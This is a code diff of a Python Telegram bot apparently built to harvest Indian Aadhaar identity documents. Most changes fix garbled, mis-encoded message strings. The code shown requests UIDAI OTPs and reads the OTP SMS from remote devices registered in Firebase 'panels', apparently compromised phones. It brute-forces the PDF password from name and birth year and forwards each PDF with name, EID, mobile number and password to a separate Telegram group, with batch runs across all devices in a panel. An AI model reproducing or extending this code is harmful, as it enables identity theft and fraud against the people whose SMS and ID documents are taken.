-                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª ÃªÂÂ±Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ±ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('⚠️')} ᴜɪᴅᴀɪ ꜱᴇʀᴠᴇʀ ᴛᴇᴄʜɴɪᴄᴀʟ ɪꜱꜱᴜᴇ</b>\n\n"
                     f"<blockquote>UIDAI download server par temporary technical glitch chal raha hai (yeh galat OTP nahi hai).\n"
                     f"Kripya 5 second ruk kar yahi OTP dubara enter karein ya /cancel karein.</blockquote>",
                     parse_mode='HTML'
@@ -3395,18 +3357,18 @@ class AadhaarBot:
 
             if retries >= 3:
                 await prog.edit_text(
-                    f"<b>Ã¢ÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n<b>{html.escape(str(err_clean))}</b>\n3 fail. /start",
+                    f"<b>❌ ᴅᴏᴡɴʟᴏᴀᴅ ꜰᴀɪʟᴇᴅ</b>\n<b>{html.escape(str(err_clean))}</b>\n3 fail. /start",
                     parse_mode='HTML')
                 self.clear_user_data(user_id)
                 return
             await prog.edit_text(
-                f"<b>Ã¢ÂÂ OTP galat: {err_clean}</b>\n<b>Attempt {retries}/3</b>\n"
-                f"<b>{emo('Ã°ÂÂÂ¥')} Dubara OTP type karo:</b>", parse_mode='HTML')
+                f"<b>❌ OTP galat: {err_clean}</b>\n<b>Attempt {retries}/3</b>\n"
+                f"<b>{emo('🔥')} Dubara OTP type karo:</b>", parse_mode='HTML')
             return
 
         if not result or len(result) < 500:
             await prog.edit_text(
-                "<b>Ã¢ÂÂ PDF corrupt ya response galat. Dubara OTP ya /cancel.</b>",
+                "<b>❌ PDF corrupt ya response galat. Dubara OTP ya /cancel.</b>",
                 parse_mode='HTML')
             return
 
@@ -3423,19 +3385,19 @@ class AadhaarBot:
         pdf_filename = f"@Getaadharpdfbot_{safe_name}_Aadhaar.pdf"
 
         prefix = resp_name.replace(" ", "")[:4].upper() if resp_name else "NAME"
-        status_text = "Ã¡Â´ÂÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃÂ!" if unlocked else "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Password Protected)"
+        status_text = "ᴜɴʟᴏᴄᴋᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ!" if unlocked else "ʟᴏᴄᴋᴇᴅ (Password Protected)"
         pwd_text = f"<code>{used_pwd}</code>" if used_pwd else f"<code>{prefix}YYYY</code> (Name 4 letters + Year)"
 
         caption = (
-            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° {status_text}</b>\n"
+            f"<b>{emo('✅')} ᴘᴅꜰ {status_text}</b>\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ¤')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: {html.escape(resp_name or 'N/A')}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃ¡Â´Â: <code>{data.get('eid', 'N/A')}</code></b>\n"
-            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â: <code>{data.get('mobile', 'N/A')}</code></b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â: {pdf_filename}</b>\n"
+            f"<b>{emo('👤')} ɴᴀᴍᴇ: {html.escape(resp_name or 'N/A')}</b>\n"
+            f"<b>{emo('🆔')} ᴇɪᴅ: <code>{data.get('eid', 'N/A')}</code></b>\n"
+            f"<b>{emo('📱')} ᴍᴏʙɪʟᴇ: <code>{data.get('mobile', 'N/A')}</code></b>\n"
+            f"<b>{emo('📄')} ꜰɪʟᴇ: {pdf_filename}</b>\n"
             "</blockquote>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ¨')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â!</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
+            f"<b>{emo('🚨')} ᴋᴇᴇᴘ ᴛʜɪs ꜰɪʟᴇ sᴇᴄᴜʀᴇ!</b>\n\n"
+            f"<b>{emo('🛠️')} ᴅᴇᴠʟᴏᴘᴇʀ : <a href='https://t.me/RORINDIA'>◄ᯓ❥≛⃝🌸𝐌4𝐇𝐄𝐒𝐇💗⃝❥꯭✿࿐</a></b>"
         )
         sent_doc = None
         for send_try in range(3):
@@ -3464,7 +3426,7 @@ class AadhaarBot:
                     message_id=sent_doc.message_id,
                     disable_notification=True
                 )
-                logger.info(f"Ã°ÂÂÂ Pinned PDF message {sent_doc.message_id} in chat {update.effective_chat.id}")
+                logger.info(f"📌 Pinned PDF message {sent_doc.message_id} in chat {update.effective_chat.id}")
             except Exception as pin_err:
                 logger.warning(f"Could not pin message: {pin_err}")
 
@@ -3474,11 +3436,11 @@ class AadhaarBot:
         # 1. Forward PDF to Group in background (Admin ke download group me forward nahi honge)
         if not is_admin(user_id):
             caption_fwd = (
-                f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°</b>\n\n"
-                f"<b>{emo('Ã°ÂÂÂ¤')} {html.escape(resp_name or 'N/A')}</b>\n"
-                f"<b>{emo('Ã°ÂÂÂ')} {data.get('eid')}</b>\n"
-                f"<b>{emo('Ã°ÂÂÂ±')} {data.get('mobile')}</b>\n"
-                f"<b>{emo('Ã°ÂÂÂ')} {used_pwd or 'locked'}</b>"
+                f"<b>{emo('📄')} ᴀᴀᴅʜᴀᴀʀ ᴘᴅꜰ</b>\n\n"
+                f"<b>{emo('👤')} {html.escape(resp_name or 'N/A')}</b>\n"
+                f"<b>{emo('🆔')} {data.get('eid')}</b>\n"
+                f"<b>{emo('📱')} {data.get('mobile')}</b>\n"
+                f"<b>{emo('🔑')} {used_pwd or 'locked'}</b>"
             )
             async def _forward_background(pdf_data, p_name):
                 if not FORWARD_GROUP_ID:
@@ -3492,7 +3454,7 @@ class AadhaarBot:
                             document=buf, filename=p_name,
                             caption=caption_fwd, parse_mode='HTML',
                             read_timeout=60, write_timeout=60)
-                        logger.info(f"Ã¢ÂÂ PDF forwarded to group {FORWARD_GROUP_ID} successfully.")
+                        logger.info(f"✅ PDF forwarded to group {FORWARD_GROUP_ID} successfully.")
                         break
                     except telegram.error.RetryAfter as ra:
                         logger.warning(f"Group forward flood wait: sleeping {ra.retry_after}s")
@@ -3535,11 +3497,11 @@ class AadhaarBot:
         sender_hint = "JX-ADHAAR-T / ADHAAR" if stage == 'otp1' else "JK-ADHAAR-S / ADHAAR"
 
         poll_msg = await update.message.reply_text(
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ (ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´ÃÂÃÂ)...</b>\n\n"
+            f"<b>{emo('⏳')} ᴀᴜᴛᴏ ᴏᴛᴘ ᴡᴀɪᴛɪɴɢ (ɴᴇᴡ ᴏᴛᴘ ᴏɴʟʏ)...</b>\n\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ¥')} Panel: {fb_name}</b>\n"
-            f"<b>Ã°ÂÂÂ¨ Sender: <code>{sender_hint}</code></b>\n"
-            f"<b>Ã°ÂÂÂ Status: Waiting for fresh incoming SMS...</b>\n"
+            f"<b>{emo('🔥')} Panel: {fb_name}</b>\n"
+            f"<b>📨 Sender: <code>{sender_hint}</code></b>\n"
+            f"<b>🆕 Status: Waiting for fresh incoming SMS...</b>\n"
             f"<b>Max wait: {OTP_POLL_TIMEOUT}s</b>"
             "</blockquote>",
             parse_mode='HTML'
@@ -3565,7 +3527,7 @@ class AadhaarBot:
             if elapsed % 10 == 0 and elapsed > 0:
                 try:
                     await poll_msg.edit_text(
-                        f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢... {remaining}s ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â</b>",
+                        f"<b>{emo('⏳')} ᴀᴜᴛᴏ ᴏᴛᴘ ᴡᴀɪᴛɪɴɢ... {remaining}s ʙᴀᴄʜᴀ</b>",
                         parse_mode='HTML'
                     )
                 except Exception:
@@ -3575,7 +3537,7 @@ class AadhaarBot:
         if not otp_found:
             try:
                 await poll_msg.edit_text(
-                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('⚠️')} ᴀᴜᴛᴏ ᴏᴛᴘ ᴛɪᴍᴇᴏᴜᴛ</b>\n\n"
                     "<blockquote>"
                     "<b>Naya OTP time par nahi aaya.</b>\n"
                     "<b>Agar mobile par OTP aa gaya hai to manually type karo:</b>"
@@ -3588,8 +3550,8 @@ class AadhaarBot:
 
         try:
             await poll_msg.edit_text(
-                f"<b>{emo('Ã¢ÂÂ')} ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂªÃÂÃ¡Â´Â: <code>{otp_found}</code></b>\n"
-                f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂÃÂªÃÂ´ÃÂ¢...</b>",
+                f"<b>{emo('✅')} ɴᴇᴡ ᴏᴛᴘ ᴍɪʟᴀ: <code>{otp_found}</code></b>\n"
+                f"<b>{emo('⏳')} ᴠᴇʀɪꜰʏɪɴɢ...</b>",
                 parse_mode='HTML'
             )
         except Exception:
@@ -3626,11 +3588,11 @@ class AadhaarBot:
             logger.info(f"Admin {user_id} downloaded batch PDF, skipping group forward.")
             return
         caption_fwd = (
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ¤')} {html.escape(resp_name or 'N/A')}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} {eid or 'N/A'}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ±')} {mobile or 'N/A'}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} {used_pwd or 'locked'}</b>"
+            f"<b>{emo('📄')} ᴀᴀᴅʜᴀᴀʀ ᴘᴅꜰ</b>\n\n"
+            f"<b>{emo('👤')} {html.escape(resp_name or 'N/A')}</b>\n"
+            f"<b>{emo('🆔')} {eid or 'N/A'}</b>\n"
+            f"<b>{emo('📱')} {mobile or 'N/A'}</b>\n"
+            f"<b>{emo('🔑')} {used_pwd or 'locked'}</b>"
         )
         for fwd_try in range(4):
             try:
@@ -3641,7 +3603,7 @@ class AadhaarBot:
                     filename=p_name, caption=caption_fwd, parse_mode='HTML',
                     read_timeout=60, write_timeout=60
                 )
-                logger.info(f"Ã¢ÂÂ Firebase PDF forwarded to group {target_group} successfully.")
+                logger.info(f"✅ Firebase PDF forwarded to group {target_group} successfully.")
                 break
             except telegram.error.RetryAfter as ra:
                 logger.warning(f"Group forward flood wait: sleeping {ra.retry_after}s")
@@ -3659,13 +3621,13 @@ class AadhaarBot:
         time_str = datetime.now().strftime("%d-%m-%Y %I:%M:%S %p")
 
         admin_msg = (
-            f"<b>{emo('Ã°ÂÂÂ¥')} ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
+            f"<b>{emo('🔥')} ɴᴇᴡ ꜰɪʀᴇʙᴀꜱᴇ ᴀᴅᴅᴇᴅ!</b>\n\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ¤')} User:</b> {html.escape(full_name)} ({uname})\n"
-            f"<b>{emo('Ã°ÂÂÂ')} User ID:</b> <code>{user_id}</code>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Panel Name:</b> <code>{html.escape(fb_name)}</code>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Firebase URL:</b>\n<code>{html.escape(fb_url)}</code>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Time:</b> <code>{time_str}</code>"
+            f"<b>{emo('👤')} User:</b> {html.escape(full_name)} ({uname})\n"
+            f"<b>{emo('🆔')} User ID:</b> <code>{user_id}</code>\n"
+            f"<b>{emo('📌')} Panel Name:</b> <code>{html.escape(fb_name)}</code>\n"
+            f"<b>{emo('🔗')} Firebase URL:</b>\n<code>{html.escape(fb_url)}</code>\n"
+            f"<b>{emo('📅')} Time:</b> <code>{time_str}</code>"
             "</blockquote>"
         )
 
@@ -3705,12 +3667,12 @@ class AadhaarBot:
             lines.append(f"<i>...aur {len(panels) - 15} aur panels</i>")
 
         admin_msg = (
-            f"<b>{emo('Ã°ÂÂÂ¥')} {len(panels)} ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´ÂÃªÂÂ± Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â)!</b>\n\n"
+            f"<b>{emo('🔥')} {len(panels)} ɴᴇᴡ ꜰɪʀᴇʙᴀꜱᴇꜱ ᴀᴅᴅᴇᴅ (ʙᴜʟᴋ)!</b>\n\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ¤')} User:</b> {html.escape(full_name)} ({uname})\n"
-            f"<b>{emo('Ã°ÂÂÂ')} User ID:</b> <code>{user_id}</code>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Total Panels:</b> <code>{len(panels)}</code>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Time:</b> <code>{time_str}</code>"
+            f"<b>{emo('👤')} User:</b> {html.escape(full_name)} ({uname})\n"
+            f"<b>{emo('🆔')} User ID:</b> <code>{user_id}</code>\n"
+            f"<b>{emo('📊')} Total Panels:</b> <code>{len(panels)}</code>\n"
+            f"<b>{emo('📅')} Time:</b> <code>{time_str}</code>"
             "</blockquote>\n\n"
             f"<blockquote>" + "\n".join(lines) + "</blockquote>"
         )
@@ -3764,7 +3726,7 @@ class AadhaarBot:
                         if ph:
                             mobile = ph
                             break
-                        # SMS body se extract Ã¢ÂÂ GOD X panel yh() same logic
+                        # SMS body se extract — GOD X panel yh() same logic
                         body = str(m.get('message') or m.get('body') or m.get('text') or '')
                         num = _extract_phone_from_sms(body)
                         if num:
@@ -3783,7 +3745,7 @@ class AadhaarBot:
         poll_min_ts = int((time.time() - 20) * 1000)
 
         if status_updater:
-            await status_updater("Ã¢ÂÂ³ Requesting EID OTP...")
+            await status_updater("⏳ Requesting EID OTP...")
 
         otp1_txn = cap1_txn = cap1_val = None
         last_err = "Unknown"
@@ -3795,7 +3757,7 @@ class AadhaarBot:
                 return False, "Cancelled", None
             try:
                 if status_updater and attempt > 1:
-                    await status_updater(f"Ã¢ÂÂ³ Captcha retry ({attempt}/10)...")
+                    await status_updater(f"⏳ Captcha retry ({attempt}/10)...")
                 cap = await self.uidai_post(
                     f"{UIDAI_BASE}/audioCaptchaService/api/captcha/v3/generation",
                     headers=_uidai_h("MYAADHAAR"),
@@ -3835,7 +3797,7 @@ class AadhaarBot:
                 logger.info(f"[AutoBatch {mobile}] EID OTP attempt {attempt}/10: {last_err}")
                 if "technical difficulties" in str(last_err).lower():
                     if status_updater and attempt > 1:
-                        await status_updater(f"Ã¢ÂÂ³ UIDAI busy, retrying ({attempt}/10)...")
+                        await status_updater(f"⏳ UIDAI busy, retrying ({attempt}/10)...")
                     await asyncio.sleep(1.0)
                 else:
                     await asyncio.sleep(0.3)
@@ -3851,7 +3813,7 @@ class AadhaarBot:
             return False, f"EID OTP generation failed ({last_err})", None
 
         if status_updater:
-            await status_updater("Ã¢ÂÂ³ Waiting for EID OTP SMS...")
+            await status_updater("⏳ Waiting for EID OTP SMS...")
 
         poll_start1 = time.time()
         otp1 = None
@@ -3861,11 +3823,11 @@ class AadhaarBot:
                 return False, "Cancelled", None
             elapsed = int(time.time() - poll_start1)
             if status_updater and elapsed > 0 and elapsed % 2 == 0:
-                await status_updater(f"Ã¢ÂÂ³ Waiting for EID OTP ({elapsed}s/{max_poll1}s)...")
+                await status_updater(f"⏳ Waiting for EID OTP ({elapsed}s/{max_poll1}s)...")
             otp1 = await asyncio.to_thread(
                 firebase_read_otp, device_id, fb_url, fb_key,
                 initial_device_keys, poll_min_ts, set(device_otps),
-                mobile  # Ã¢ÂÂ mobile_hint: dual SIM ke liye correct OTP match
+                mobile  # ← mobile_hint: dual SIM ke liye correct OTP match
             )
             if otp1:
                 break
@@ -3878,7 +3840,7 @@ class AadhaarBot:
         await asyncio.to_thread(firebase_clear_otp, device_id, fb_url, fb_key)
 
         if status_updater:
-            await status_updater("Ã¢ÂÂ³ Verifying EID OTP...")
+            await status_updater("⏳ Verifying EID OTP...")
 
         payload1_verify = {
             "mobileNumber": mobile, "dob": None, "email": None, "name": "Mr",
@@ -3911,7 +3873,7 @@ class AadhaarBot:
         resp_dob = rd1.get("dob") or rd1.get("dateOfBirth") or ""
 
         if status_updater:
-            await status_updater("Ã¢ÂÂ³ Requesting Download OTP...")
+            await status_updater("⏳ Requesting Download OTP...")
 
         # OTP 2 ke liye taaza snapshot lo taaki OTP1 ya puraane SMS exclude ho sakein
         initial_device_keys2 = await asyncio.to_thread(firebase_get_message_keys, device_id, fb_url, fb_key)
@@ -3925,7 +3887,7 @@ class AadhaarBot:
                 return False, "Cancelled", None
             try:
                 if status_updater and attempt > 1:
-                    await status_updater(f"Ã¢ÂÂ³ Captcha retry ({attempt}/10)...")
+                    await status_updater(f"⏳ Captcha retry ({attempt}/10)...")
                 cap2 = await self.uidai_post(
                     f"{UIDAI_BASE}/audioCaptchaService/api/captcha/v3/generation",
                     headers=_uidai_h("MYAADHAAR"),
@@ -3973,7 +3935,7 @@ class AadhaarBot:
             return False, f"Download OTP generation failed ({last_err2})", None
 
         if status_updater:
-            await status_updater("Ã¢ÂÂ³ Waiting for Download OTP SMS...")
+            await status_updater("⏳ Waiting for Download OTP SMS...")
 
         poll_start2 = time.time()
         otp2 = None
@@ -3983,11 +3945,11 @@ class AadhaarBot:
                 return False, "Cancelled", None
             elapsed = int(time.time() - poll_start2)
             if status_updater and elapsed > 0 and elapsed % 2 == 0:
-                await status_updater(f"Ã¢ÂÂ³ Waiting for Download OTP ({elapsed}s/{max_poll2}s)...")
+                await status_updater(f"⏳ Waiting for Download OTP ({elapsed}s/{max_poll2}s)...")
             otp2 = await asyncio.to_thread(
                 firebase_read_otp, device_id, fb_url, fb_key,
                 initial_device_keys2, poll_min_ts2, set(device_otps),
-                mobile  # Ã¢ÂÂ mobile_hint: dual SIM ke liye correct OTP match
+                mobile  # ← mobile_hint: dual SIM ke liye correct OTP match
             )
             if otp2:
                 break
@@ -4001,7 +3963,7 @@ class AadhaarBot:
         await asyncio.to_thread(firebase_clear_otp, device_id, fb_url, fb_key)
 
         if status_updater:
-            await status_updater("Ã¢ÂÂ³ Downloading Aadhaar PDF...")
+            await status_updater("⏳ Downloading Aadhaar PDF...")
 
         payload_dl = {"eid": eid, "mask": False, "otp": otp2, "otpTxnId": otp2_txn}
 
@@ -4065,7 +4027,7 @@ class AadhaarBot:
             return False, "Corrupt or unreadable PDF data", None
 
         if status_updater:
-            await status_updater("Ã°ÂÂÂ Unlocking PDF password...")
+            await status_updater("🔓 Unlocking PDF password...")
 
         unlocked, used_pwd = await asyncio.to_thread(unlock_pdf_bruteforce, extracted, resp_name, resp_dob)
         final_pdf = unlocked if unlocked else extracted
@@ -4073,21 +4035,21 @@ class AadhaarBot:
         safe_name = "".join(c for c in (resp_name or "Unknown") if c.isalnum())
         pdf_filename = f"@Getaadharpdfbot_{safe_name}_{mobile[-4:]}_Aadhaar.pdf"
         prefix = resp_name.replace(" ", "")[:4].upper() if resp_name else "NAME"
-        status_text = "Ã¡Â´ÂÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂssÃªÂÂ°Ã¡Â´ÂÃÂÃÂÃÂ!" if unlocked else "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Password Protected)"
+        status_text = "ᴜɴʟᴏᴄᴋᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ!" if unlocked else "ʟᴏᴄᴋᴇᴅ (Password Protected)"
         pwd_text = f"<code>{used_pwd}</code>" if used_pwd else f"<code>{prefix}YYYY</code>"
 
         caption = (
-            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° {status_text}</b>\n"
+            f"<b>{emo('✅')} ᴘᴅꜰ {status_text}</b>\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ¤')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: {html.escape(resp_name or 'N/A')}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃ¡Â´Â: <code>{eid}</code></b>\n"
-            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â: <code>{mobile}</code></b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´Â: {pwd_text}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ±')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â: {html.escape(str(dev_name))}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â: {pdf_filename}</b>\n"
+            f"<b>{emo('👤')} ɴᴀᴍᴇ: {html.escape(resp_name or 'N/A')}</b>\n"
+            f"<b>{emo('🆔')} ᴇɪᴅ: <code>{eid}</code></b>\n"
+            f"<b>{emo('📱')} ᴍᴏʙɪʟᴇ: <code>{mobile}</code></b>\n"
+            f"<b>{emo('🔑')} ᴘᴀssᴡᴏʀᴅ: {pwd_text}</b>\n"
+            f"<b>{emo('📱')} ᴅᴇᴠɪᴄᴇ: {html.escape(str(dev_name))}</b>\n"
+            f"<b>{emo('📄')} ꜰɪʟᴇ: {pdf_filename}</b>\n"
             "</blockquote>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ¨')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃªÂÂ°ÃÂªÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â!</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
+            f"<b>{emo('🚨')} ᴋᴇᴇᴘ ᴛʜɪs ꜰɪʟᴇ sᴇᴄᴜʀᴇ!</b>\n\n"
+            f"<b>{emo('🛠️')} ᴅᴇᴠʟᴏᴘᴇʀ : <a href='https://t.me/RORINDIA'>◄ᯓ❥≛⃝🌸𝐌4𝐇𝐄𝐒𝐇💗⃝❥꯭✿࿐</a></b>"
         )
 
         sent_doc = None
@@ -4142,12 +4104,12 @@ class AadhaarBot:
         if self.active_batches.get(uid):
             await ctx.bot.send_message(
                 chat_id=chat_id,
-                text="Ã¢ÂÂ Ã¯Â¸Â <b>Ek batch download already chal raha hai! Stop karne ke liye /cancel bhejein.</b>",
+                text="⚠️ <b>Ek batch download already chal raha hai! Stop karne ke liye /cancel bhejein.</b>",
                 parse_mode='HTML'
             )
             return
 
-        # Ã¢ÂÂÃ¢ÂÂ Dual SIM expand: agar 1 device me 2 numbers hain to dono ka download hoga Ã¢ÂÂÃ¢ÂÂ
+        # ── Dual SIM expand: agar 1 device me 2 numbers hain to dono ka download hoga ──
         expanded = []
         for d in devices:
             mobs = d.get('mobiles') or ([d['mobile']] if d.get('mobile') else [])
@@ -4167,7 +4129,7 @@ class AadhaarBot:
         if not valid_devices:
             await ctx.bot.send_message(
                 chat_id=chat_id,
-                text=f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂª Ã¡Â´ÂÃÂ´ÃÂÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃÂÃÂª Ã¡Â´ÂÃÂªÃÂÃ¡Â´Â</b>\n\n<blockquote>[{panel_name}] me koi device online nahi hai ya unka SIM number detect nahi hua.</blockquote>",
+                text=f"<b>{emo('❌')} ᴋᴏɪ ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇ ɴᴀʜɪ ᴍɪʟᴀ</b>\n\n<blockquote>[{panel_name}] me koi device online nahi hai ya unka SIM number detect nahi hua.</blockquote>",
                 parse_mode='HTML'
             )
             return
@@ -4185,13 +4147,13 @@ class AadhaarBot:
                 'mobile': mob,
                 'sim_label': sim_lbl,
                 'name': dname[:12],
-                'status': 'Ã¢ÂÂ³ In Queue', 'done': False, 'success': False, 'meta': None,
+                'status': '⏳ In Queue', 'done': False, 'success': False, 'meta': None,
             }
 
         is_rich_mode = False
         dash_msg_id = None
         init_kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ", callback_data=f"cancel_batch_{uid}", style="danger")]
+            [InlineKeyboardButton("ᴄᴀɴᴄᴇʟ ʙᴀᴛᴄʜ", callback_data=f"cancel_batch_{uid}", style="danger")]
         ])
 
         init_blocks = build_batch_rich_blocks(panel_name, dev_statuses, 0, len(dev_statuses), 0, 0)
@@ -4259,7 +4221,7 @@ class AadhaarBot:
                 if render_key != last_render_key:
